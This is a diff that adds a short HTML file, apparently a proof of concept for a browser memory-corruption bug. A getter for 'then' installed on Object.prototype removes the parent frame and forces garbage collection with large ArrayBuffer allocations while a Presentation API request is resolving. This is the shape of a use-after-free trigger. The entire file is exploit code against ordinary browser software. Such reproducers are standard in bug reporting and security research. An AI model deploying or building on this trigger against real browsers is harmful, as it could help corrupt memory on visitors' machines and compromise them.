@@ -1,0 +1,30 @@
+<html>
+    <head>
+        <script>
+                Object.prototype.__defineGetter__("then", function() {
+                        parent.remove();
+                        gc();
+                });
+
+                function start(){
+                    request = new PresentationRequest([location]);
+                    request.start().then(
+                        connection=>{
+                            console.log(2);
+                        }
+                    );
+                }
+
+                function gc(){
+                    for(let i = 0; i < 0x20; i++){
+                        try{ new ArrayBuffer(0x1000000);}catch(e){};
+                    }
+                }
+                
+            
+        </script>
+    </head>
+    <body>
+        <button onclick="start()">Click me</button>
+    </body>
+</html>
